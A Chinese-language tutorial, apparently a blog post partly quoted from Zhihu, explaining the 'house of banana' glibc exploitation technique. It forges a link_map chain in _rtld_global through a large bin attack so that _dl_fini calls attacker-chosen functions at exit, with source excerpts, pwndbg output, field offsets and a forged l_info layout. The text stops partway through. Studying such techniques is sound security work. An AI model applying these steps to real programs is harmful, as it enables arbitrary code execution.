<h1 id="house-of-banana"><a href="#house-of-banana" class="headerlink" title="house of banana"></a>house of banana</h1><h3 id="适用场景（满足任一条件即可）："><a href="#适用场景（满足任一条件即可）：" class="headerlink" title="适用场景（满足任一条件即可）："></a>适用场景（满足任一条件即可）：</h3><h4 id="1-程序能够显式的执行exit函数"><a href="#1-程序能够显式的执行exit函数" class="headerlink" title="1.程序能够显式的执行exit函数"></a>1.程序能够显式的执行exit函数</h4><h4 id="2-程序通过libc-start-main启动的主函数，且主函数能够结束"><a href="#2-程序通过libc-start-main启动的主函数，且主函数能够结束" class="headerlink" title="2.程序通过libc_start_main启动的主函数，且主函数能够结束"></a>2.程序通过libc_start_main启动的主函数，且主函数能够结束</h4><h3 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h3><p>在ld.so里，存在一个_rtld_global指针，指向rtld_global结构体</p>
<p><img src="https://p0.ssl.qhimg.com/t01b23a2bb2487c3f57.png" alt="img"></p>
<p>该结构体较为复杂</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">struct rtld_global</span><br><span class="line">&#123;</span><br><span class="line">#endif</span><br><span class="line">  /* Don&#x27;t change the order of the following elements.  &#x27;dl_loaded&#x27;</span><br><span class="line">     must remain the first element.  Forever.  */</span><br><span class="line"></span><br><span class="line">/* Non-shared code has no support for multiple namespaces.  */</span><br><span class="line">#ifdef SHARED</span><br><span class="line"># define DL_NNS 16</span><br><span class="line">#else</span><br><span class="line"># define DL_NNS 1</span><br><span class="line">#endif</span><br><span class="line">  EXTERN struct link_namespaces</span><br><span class="line">  &#123;</span><br><span class="line">    /* A pointer to the map for the main map.  */</span><br><span class="line">    struct link_map *_ns_loaded;</span><br><span class="line">    /* Number of object in the _dl_loaded list.  */</span><br><span class="line">    unsigned int _ns_nloaded;</span><br><span class="line">    /* Direct pointer to the searchlist of the main object.  */</span><br><span class="line">    struct r_scope_elem *_ns_main_searchlist;</span><br><span class="line">    /* This is zero at program start to signal that the global scope map is</span><br><span class="line">       allocated by rtld.  Later it keeps the size of the map.  It might be</span><br><span class="line">       reset if in _dl_close if the last global object is removed.  */</span><br><span class="line">    unsigned int _ns_global_scope_alloc;</span><br><span class="line"></span><br><span class="line">    /* During dlopen, this is the number of objects that still need to</span><br><span class="line">       be added to the global scope map.  It has to be taken into</span><br><span class="line">       account when resizing the map, for future map additions after</span><br><span class="line">       recursive dlopen calls from ELF constructors.  */</span><br><span class="line">    unsigned int _ns_global_scope_pending_adds;</span><br><span class="line"></span><br><span class="line">    /* Once libc.so has been loaded into the namespace, this points to</span><br><span class="line">       its link map.  */</span><br><span class="line">    struct link_map *libc_map;</span><br><span class="line"></span><br><span class="line">    /* Search table for unique objects.  */</span><br><span class="line">    struct unique_sym_table</span><br><span class="line">    &#123;</span><br><span class="line">      __rtld_lock_define_recursive (, lock)</span><br><span class="line">      struct unique_sym</span><br><span class="line">      &#123;</span><br><span class="line">    uint32_t hashval;</span><br><span class="line">    const char *name;</span><br><span class="line">    const ElfW(Sym) *sym;</span><br><span class="line">    const struct link_map *map;</span><br><span class="line">      &#125; *entries;</span><br><span class="line">      size_t size;</span><br><span class="line">      size_t n_elements;</span><br><span class="line">      void (*free) (void *);</span><br><span class="line">    &#125; _ns_unique_sym_table;</span><br><span class="line">    /* Keep track of changes to each namespace&#x27; list.  */</span><br><span class="line">    struct r_debug _ns_debug;</span><br><span class="line">  &#125; _dl_ns[DL_NNS];</span><br><span class="line">  /* One higher than index of last used namespace.  */</span><br><span class="line">  EXTERN size_t _dl_nns;</span><br><span class="line">.................................................................................</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>其中可以看到里面有多个<code>_dl_ns</code>结构体，调试发现，该结构体存储着的实际就是elf各段的符号结构体</p>
<p><img src="https://p2.ssl.qhimg.com/t014a1a2df2f9476720.png" alt="img"></p>
<p>，类似于IDA中的段结构体</p>
<p><img src="https://p0.ssl.qhimg.com/t017312b35952d01ad7.png" alt="img"></p>
<p>我们较为关注的是fini_array段的动态链接结构体指针</p>
<p><img src="https://p1.ssl.qhimg.com/t012462ff5820e0e81b.png" alt="img"></p>
<p>该结构体实际在在_dl_fini中被使用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">  if (l-&gt;l_info[DT_FINI_ARRAY] != NULL)</span><br><span class="line">&#123;</span><br><span class="line">  ElfW(Addr) *array =</span><br><span class="line">    (ElfW(Addr) *) (l-&gt;l_addr</span><br><span class="line">            + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">  unsigned int i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">            / sizeof (ElfW(Addr)));</span><br><span class="line">  while (i-- &gt; 0)</span><br><span class="line">    ((fini_t) array[i]) ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>汇编中对应的代码如下</p>
<p><img src="https://p2.ssl.qhimg.com/t018e401caf62becc99.png" alt="img"></p>
<p>因此，伪造该结构体指针，可以使得array指向我们可控的数据区，从而布置下一系列函数，进而劫持程序的流，那么house of  banana的思想就是利用large bin  attack往rtld_global写入堆的地址，并事先在堆里伪造好rtld_global结构体，这样程序exit或者正常退出main函数时，便会执行到伪造的fini_array数组。</p>
<p>知乎摘抄：</p>
<h2 id="house-of-banana-1"><a href="#house-of-banana-1" class="headerlink" title="house of banana"></a>house of banana</h2><p>house of banana 是ha1vk师傅在2020年总结出来的利用链。不同于IO_str_finish和IO_str_overflow利用，banana攻击的是_rtld_global结构体中的link_map链表。</p>
<p>攻击的位置houm是在程序结束后调用exit，或者程序由libc_start_main启动，并且主函数可以正常结束返回。（这里提到了exit，不得不提一下以往的攻击exit_hook，配合onegadget获得shell，目前为止，到glibc2.34ubuntu3依旧可以利用，但是在3.2版本下该地址没有了可写权限，所以失效了）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">//2.34 0ubuntu3.2</span><br><span class="line">RAX  0x1</span><br><span class="line"> RBX  0x7ffff7fad9f8 (__elf_set___libc_atexit_element__IO_cleanup__) —▸ 0x7ffff7e26b10 (_IO_cleanup) ◂— endbr64 </span><br><span class="line"> RCX  0x0</span><br><span class="line"> RDX  0x1</span><br><span class="line"> RDI  0x555555558148 ◂— 0x0</span><br><span class="line">```</span><br><span class="line">0x7ffff7ddd58f &lt;__run_exit_handlers+431&gt;    nop    </span><br><span class="line"> ► 0x7ffff7ddd590 &lt;__run_exit_handlers+432&gt;    call   qword ptr [rbx]               &lt;_IO_cleanup&gt;</span><br><span class="line">        rdi: 0x555555558148 ◂— 0x0</span><br><span class="line">        rsi: 0x0</span><br><span class="line">        rdx: 0x1</span><br><span class="line">        rcx: 0x0</span><br><span class="line">```</span><br><span class="line">pwndbg&gt; vmmap 0x7ffff7fad9f8</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    0x7ffff7fad000     0x7ffff7fb1000 r--p     4000 214000 /usr/lib/x86_64-linux-gnu/libc.so.6 +0x9f8</span><br><span class="line">pwndbg&gt; x 0x7ffff7fad9f8</span><br><span class="line">0x7ffff7fad9f8 &lt;__elf_set___libc_atexit_element__IO_cleanup__&gt;: 0xf7e26b10</span><br></pre></td></tr></table></figure>

<p>house  of banana  相较于以往的攻击手法，其实思路很明确。在程序通过显式调用exit，或者main函数是由__libc_start_main唤起，并可以正常的返回时，由于动态链接的加载机制，程序中并没有exit函数的真实调用，而是要通过符号表来获得真实的函数地址。（有关动态链接延迟绑定的技术，还请自行查阅，这里不做过多的阐述。）我们联想到ret2_dl_resolve技术。</p>
<p>下面是exit执行的一个过程</p>
<h2 id="exit-gt-dl-fini-gt-fini-t-array-i"><a href="#exit-gt-dl-fini-gt-fini-t-array-i" class="headerlink" title="exit -&gt; _dl_fini -&gt;((fini_t) array[i]) ();"></a>exit -&gt; _dl_fini -&gt;((fini_t) array[i]) ();</h2><p>banana手法，通过伪造修改相关的表项，以达到调用后门来获得权限。这里我们重点说一下，在ubuntu3.2下利用的可行性。大多数师傅对于banana的攻击方式主要有两种，一是攻击_rtld_global这个全局符号所保存的link_map的链表。伪造整个链表，进行劫持。相关的全局变量是可以写的。后面会解释这个变量的用处。</p>
<p><img src="https://pic1.zhimg.com/80/v2-aa81caf3ce7fdb69e7aabdb0155b2658_1440w.png" alt="img"></p>
<p>另外一个与之相比破坏性比较小，更容易成功。由于link_map通过链表链接，但是在加载exit的时候，相关函数只会通过link_map-&gt;l_next指针进行相关的检查。我们可以在某个特定的位置，更改next指针，将下一以链表节点转为我们控制的地方，比如heap上。</p>
<p>很多朋友看了上面的可能会比较蒙，下面我具体说一参数。</p>
<p>关于link_map,我们攻击exit时，会使用到一个link_map 的链表，链表的一些信息保存在struct rtld_global结构体中，这个结构体信息很多，很繁杂，但是banana只用到了几个关键的点。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;_rtld_global</span><br><span class="line">$1 = (struct rtld_global *) 0x7f56e43b9040 &lt;_rtld_global&gt;</span><br><span class="line">    //以下是结构体信息的展开，pwndbg为我们做了整理</span><br><span class="line">pwndbg&gt; p _rtld_global</span><br><span class="line">$2 = &#123;</span><br><span class="line">  _dl_ns = &#123;&#123;</span><br><span class="line">      _ns_loaded = 0x7f56e43ba220,    //#1</span><br><span class="line">      _ns_nloaded = 4,      //#2</span><br><span class="line">      _ns_main_searchlist = 0x7f56e43ba4e0,</span><br><span class="line">      _ns_global_scope_alloc = 0,</span><br><span class="line">      _ns_global_scope_pending_adds = 0,</span><br><span class="line">      libc_map = 0x7f56e4382000,</span><br><span class="line">      _ns_unique_sym_table = &#123;</span><br><span class="line">        lock = &#123;</span><br><span class="line">          mutex = &#123;</span><br><span class="line">            __data = &#123;</span><br><span class="line">              __lock = 0,</span><br><span class="line">              __count = 0,</span><br><span class="line">              __owner = 0,</span><br><span class="line">              __nusers = 0,</span><br><span class="line">              __kind = 1,</span><br><span class="line">              __spins = 0,</span><br><span class="line">              __elision = 0,</span><br><span class="line">              __list = &#123;</span><br><span class="line">                __prev = 0x0,</span><br><span class="line">                __next = 0x0</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            __size = &#x27;\000&#x27; &lt;repeats 16 times&gt;, &quot;\001&quot;, &#x27;\000&#x27; &lt;repeats 22 times&gt;,</span><br><span class="line">            __align = 0</span><br><span class="line">          &#125;</span><br><span class="line">....    </span><br><span class="line">  //展开数据会很多，但是只是对链表个节点信息的汇总</span><br></pre></td></tr></table></figure>

<p>我们需要关注的是，</p>
<p>#1，_ns_loaded = 0x7f56e43ba220, 这是整个链表的头节点，</p>
<p>#2， _ns_nloaded = 4, 这里知名个这个链表的节点个数，在exit后面加载的检查中，会要求_ns_nloaded链表的节点不少于3个</p>
<p>（后面我会给出相关的源码）</p>
<p>然后对于每个节点，都是link_map结构体，我们利用第一个节点做一下简单说明(省略了部分无关的数据)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(struct link_map *)0x7f56e43ba220</span><br><span class="line">$3 = &#123;</span><br><span class="line">  l_addr = 94172888551424,</span><br><span class="line">  l_name = 0x7f56e43ba7c8 &quot;&quot;,</span><br><span class="line">  l_ld = 0x55a655922000,</span><br><span class="line">  l_next = 0x7f56e43ba7d0,   //#3</span><br><span class="line">  l_prev = 0x0,       </span><br><span class="line">  l_real = 0x7f56e43ba220,   //#3</span><br><span class="line">  l_ns = 0,</span><br><span class="line">  l_libname = 0x7f56e43ba7b0,</span><br><span class="line">  l_info = &#123;0x0, 0x55a655922010, 0x55a6559220f0, 0x55a6559220e0, 0x0, 0x55a655922090, 0x55a6559220a0, 0x55a655922120, 0x55a655922130, 0x55a655922140, 0x55a6559220b0, 0x55a6559220c0, 0x55a655922020, 0x55a655922030, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x55a655922100, 0x55a6559220d0, 0x0, 0x55a655922110, 0x55a655922160, 0x55a655922040, 0x55a655922060, 0x55a655922050, 0x55a655922070, 0x55a655922000, 0x55a655922150, 0x0, 0x0, 0x0, 0x0, 0x55a655922180, 0x55a655922170, 0x0, 0x0, 0x55a655922160, 0x0, 0x55a6559221a0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x55a655922190, 0x0 &lt;repeats 25 times&gt;, 0x55a655922080&#125;,   //#4</span><br><span class="line">  l_phdr = 0x55a65591d040,</span><br><span class="line">......</span><br><span class="line">  l_direct_opencount = 1,</span><br><span class="line">  l_type = lt_executable,</span><br><span class="line">  l_relocated = 1,</span><br><span class="line">  l_init_called = 1,     //#5</span><br><span class="line">  l_global = 1,</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们需要关注的：</p>
<p>#3，l_next = 0x7f56e43ba7d0, ，指向下一个link_map 的指针，我们就是通过修改这个，将下一个节点劫持为我们伪造的link_map</p>
<p>#4 , l_real = 0x7f56e43ba220 ,,指向的的自身的地址，这里也是后面需要检查的地方。</p>
<p>#5, l_init_called = 1,简单说，就是为了绕过检查。</p>
<p>下面是_dl_fini函数的源码（我已经删除了部分注释及代码，源码路径为glibc2.34/elf/dl-fini.c）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">void</span><br><span class="line">_dl_fini (void)</span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">   struct link_map *maps[nloaded];    </span><br><span class="line"></span><br><span class="line">   unsigned int i;</span><br><span class="line">   struct link_map *l;</span><br><span class="line">   assert (nloaded != 0 || GL(dl_ns)[ns]._ns_loaded == NULL);</span><br><span class="line">   for (l = GL(dl_ns)[ns]._ns_loaded, i = 0; l != NULL; l = l-&gt;l_next)</span><br><span class="line">     /* Do not handle ld.so in secondary namespaces.  */</span><br><span class="line">     if (l == l-&gt;l_real)      //检查节点的地址是否跟自己结构体保存的一致</span><br><span class="line">       &#123;</span><br><span class="line">  assert (i &lt; nloaded);</span><br><span class="line"></span><br><span class="line">  maps[i] = l;</span><br><span class="line">  l-&gt;l_idx = i;</span><br><span class="line">  ++i;</span><br><span class="line"></span><br><span class="line">  /* Bump l_direct_opencount of all objects so that they</span><br><span class="line">     are not dlclose()ed from underneath us.  */</span><br><span class="line">  ++l-&gt;l_direct_opencount;</span><br><span class="line">       &#125;</span><br><span class="line">   assert (ns != LM_ID_BASE || i == nloaded);</span><br><span class="line">   assert (ns == LM_ID_BASE || i == nloaded || i == nloaded - 1);</span><br><span class="line">   unsigned int nmaps = i;</span><br><span class="line"></span><br><span class="line">   _dl_sort_maps (maps + (ns == LM_ID_BASE), nmaps - (ns == LM_ID_BASE),</span><br><span class="line">    NULL, true);</span><br><span class="line"></span><br><span class="line">   __rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br><span class="line"></span><br><span class="line">   for (i = 0; i &lt; nmaps; ++i)</span><br><span class="line">     &#123;</span><br><span class="line">       struct link_map *l = maps[i];   //l遍历link_map的链表</span><br><span class="line"></span><br><span class="line">       if (l-&gt;l_init_called)     //重要的检查点</span><br><span class="line">  &#123;</span><br><span class="line">    l-&gt;l_init_called = 0;      </span><br><span class="line"></span><br><span class="line">    /* Is there a destructor function?  */</span><br><span class="line">    if (l-&gt;l_info[DT_FINI_ARRAY] != NULL</span><br><span class="line">        || (ELF_INITFINI &amp;&amp; l-&gt;l_info[DT_FINI] != NULL))</span><br><span class="line">      &#123;</span><br><span class="line">        /* When debugging print a message first.  */</span><br><span class="line">        if (__builtin_expect (GLRO(dl_debug_mask)</span><br><span class="line">         &amp; DL_DEBUG_IMPCALLS, 0))</span><br><span class="line">   _dl_debug_printf (&quot;\ncalling fini: %s [%lu]\n\n&quot;,</span><br><span class="line">       DSO_FILENAME (l-&gt;l_name),</span><br><span class="line">       ns);</span><br><span class="line"></span><br><span class="line">        /* First see whether an array is given.  */</span><br><span class="line">        if (l-&gt;l_info[DT_FINI_ARRAY] != NULL)</span><br><span class="line">   &#123;</span><br><span class="line">     ElfW(Addr) *array =</span><br><span class="line">       (ElfW(Addr) *) (l-&gt;l_addr</span><br><span class="line">         + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">     unsigned int i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">         / sizeof (ElfW(Addr)));</span><br><span class="line">     while (i-- &gt; 0)</span><br><span class="line">       ((fini_t) array[i]) ();     //目标位置</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>总结下我们需要绕过那些检查</p>
<ol>
<li><p>判断_ns_loaded链表中至少有三个节点（dl-fini开始部分通过循环遍历链表，做检查，）</p>
</li>
<li><p>检查l == l-&gt;l_real</p>
</li>
<li><p>检查l == l-&gt;l_real检查l-&gt;l_init_called &gt; 8 这个其实跟数据的处理有关</p>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">unsigned int l_relocated:1; /* Nonzero if object&#x27;s relocations done.  */</span><br><span class="line">    unsigned int l_init_called:1; /* Nonzero if DT_INIT function called.  */</span><br><span class="line">    unsigned int l_global:1; /* Nonzero if object in _dl_global_scope.  */</span><br><span class="line">    unsigned int l_reserved:2; /* Reserved for internal use.  */</span><br><span class="line">    unsigned int l_phdr_allocated:1; /* Nonzero if the data structure pointed</span><br><span class="line">     to by `l_phdr&#x27; is allocated.  */</span><br><span class="line">    unsigned int l_soname_added:1; /* Nonzero if the SONAME is for sure in</span><br></pre></td></tr></table></figure>

<p>在link_map结构体中，这个变量是4字节，与结构体开始位置的偏移量为0x31c。pwndbg帮我们解释了数据的结果，这里的数据要大于8，我们不妨之际设置为9.不同节点可以有所差异，下面是一个结果为1 的数据</p>
<p><img src="https://pic2.zhimg.com/80/v2-edd4f01f64289f36b526d0b187334955_1440w.png" alt="img"></p>
<p>以及一个不为1 的数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(struct link_map *)0x7f56e43ba7d0</span><br><span class="line">$5 = &#123;</span><br><span class="line">  l_addr = 140725148598272,</span><br><span class="line">  l_name = 0x7ffd207e4371 &quot;linux-vdso.so.1&quot;,</span><br><span class="line">  l_ld = 0x7ffd207e43e0,</span><br><span class="line">  l_next = 0x7f56e4382000,</span><br><span class="line">  l_prev = 0x7f56e43ba220,</span><br><span class="line">  l_real = 0x7f56e43ba7d0,</span><br><span class="line">...</span><br><span class="line">  l_relocated = 1,</span><br><span class="line">  l_init_called = 0,</span><br><span class="line">  l_global = 0,</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; x/wx 0x7f56e43ba7d0+0x31c</span><br><span class="line">0x7f56e43baaec: 0x00000005</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<p>\4.  检查l-&gt;l_info[DT_FINI_ARRAY] != NULL，unsigned int i =  (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_valDT_FINI_ARRAY宏定义为26，DT_FINI_ARRAYSZ宏定义为28，所以l_info[26],以及l_info[28]不能是null(28是因为i会影响到函数  ((fini_t) array[i]) ();调用)</p>
<p>下面我们具体说说如何伪造，我选择利用修改第三节点的l_next指针，指向一个chunk,并在chunk上部署我们伪造的link_map.这里依赖任意地址写，可通过largebin   attack实现，或者其他漏洞造成的可以任意地址写堆地址。第三节点的指针在哪？_rtld_global符号并不在libc文件，而是在ld.so文件中，我们要泄露出程序的ld基址，pwndbg为我们提供了一个函数求偏移量</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; distance &amp;_rtld_global &amp;(_rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next)</span><br><span class="line">0x7f56e43b9040-&gt;0x7f56e4382018 is -0x37028 bytes (-0x6e05 words)</span><br></pre></td></tr></table></figure>

<p>由此我们就知道了需要向哪里写入chunk.</p>
<p>接下来就是重点，我们如何伪造link_map.</p>
<p>因为原来的链表中只有4个节点，而我们伪造的link_map有恰是第四个，所以，l_next就是0，l_prve无所谓，直接写0即可。l_real就是我们的伪造的link_map的开始地址，也是我们修改后的第三节点的l_next的值。这几个值离link_map的首地址很近，可以很直接的看出偏移量。接下来就是l_info的伪造。l_info[26]不为0，这是结构体内的数组，distance可以得到info[26]  info[28]关于节点地址的偏移量，同样我们可以得到上面提到的l_init_called的偏移量</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; distance _rtld_global._dl_ns._ns_loaded &amp;_rtld_global._dl_ns._ns_loaded-&gt;l_info[26]</span><br><span class="line">0x7f56e43ba220-&gt;0x7f56e43ba330 is 0x110 bytes (0x22 words)</span><br><span class="line">pwndbg&gt; distance _rtld_global._dl_ns._ns_loaded &amp;_rtld_global._dl_ns._ns_loaded-&gt;l_info[28]</span><br><span class="line">0x7f56e43ba220-&gt;0x7f56e43ba340 is 0x120 bytes (0x24 words)</span><br><span class="line">pwndbg&gt; distance _rtld_global._dl_ns._ns_loaded &amp;_rtld_global._dl_ns._ns_loaded-&gt;l_init_called</span><br><span class="line">0x7f56e43ba220-&gt;0x7f56e43ba53c is 0x31c bytes (0x63 words)</span><br></pre></td></tr></table></figure>

<p>重点来了，info这连个位置我们写入什么数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">l_info = &#123;0x0, 0x41, 0x0, 0x55a656f072f8, 0x8, 0x7f56e4244cec &lt;__execvpe+652&gt;, 0xa, 0x0, 0x0, 0x41, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x41, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x41, 0x0, 0x0, 0x55a656f072e0, 0x0, 0x55a656f072e8, 0xa, 0x0, 0x41, 0x9, 0xa, 0x0, 0x0, 0x0, 0x0, 0x0, 0x41, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x41, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x41, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x41, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x41, 0x0, 0x0, 0x0&#125;,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">  if (l-&gt;l_info[DT_FINI_ARRAY] != NULL)</span><br><span class="line">   &#123;</span><br><span class="line">     ElfW(Addr) *array =</span><br><span class="line">       (ElfW(Addr) *) (l-&gt;l_addr+ l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">     unsigned int i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val/ sizeof (ElfW(Addr)));</span><br><span class="line">     while (i-- &gt; 0)</span><br><span class="line">       ((fini_t) array[i]) ();     //目标位置</span><br></pre></td></tr></table></figure>

<p>这是一个比较通用的info，0x7f56e4244cec &lt;__execvpe+652&gt;是我们想要执行的函数。</p>
<p>我们再看源码的相关部分，正常情况下，exit使用的就是第四个节点的l_info的数据，也就是使用我们伪造的info。</p>
<p>sizeof  (ElfW(Addr)) = 8，为了方便解释，我们将这里  l-&gt;l_info[DT_FINI_ARRAYSZ]的数据记为ptr，ptr-&gt;d_un.d_ptr,其实就是ptr+0x8所指向的数据。ptr是我们要伪造的数据，他是堆中的一个可控制的位置。我们想要执行一次就可以获得shell，我们不妨让i  =1,然后我们需要在ptr+8的位置写入的就是1*8=8</p>
<p>我们还要确定的是arry数组。(l-&gt;l_addr+ l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</p>
